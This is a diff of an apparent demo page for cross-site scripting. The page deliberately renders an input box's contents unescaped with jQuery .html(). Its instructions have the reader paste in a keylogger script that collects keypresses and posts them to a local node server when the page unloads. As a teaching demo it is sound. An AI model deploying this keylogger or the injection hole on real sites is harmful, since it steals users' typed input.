@@ -11,12 +11,17 @@
         <div></div>
         <pre>
 
+
+Server Side:
+- Run the node server: $ node app.js
+
+
+Client Side:
 - Copy code below
 - Paste into input box above
 - Click submit
 - Open console
 - Start typing random words
-- Go to:
 - You should see your letters displayed
 
 ------------------------------------------
@@ -32,14 +37,12 @@
     $(document).on('keypress',function(key){
         var letter = String.fromCharCode(key.charCode);
         phrase.push(letter);
-        if (key.charCode === 13){
-            $.post('http://localhost:5000/' + phrase.toString());
-        };
     });
 
-    $(document).on('click',function(){
+
+    window.onbeforeunload = function () {
         $.post('http://localhost:5000/' + phrase.toString());
-    });
+    };
 
 
 &lt;/script>
@@ -51,6 +54,7 @@
             $("button").on('click', function(){
                 $("div").html($("input").val())
             })
+
 
         </script>
     </body>
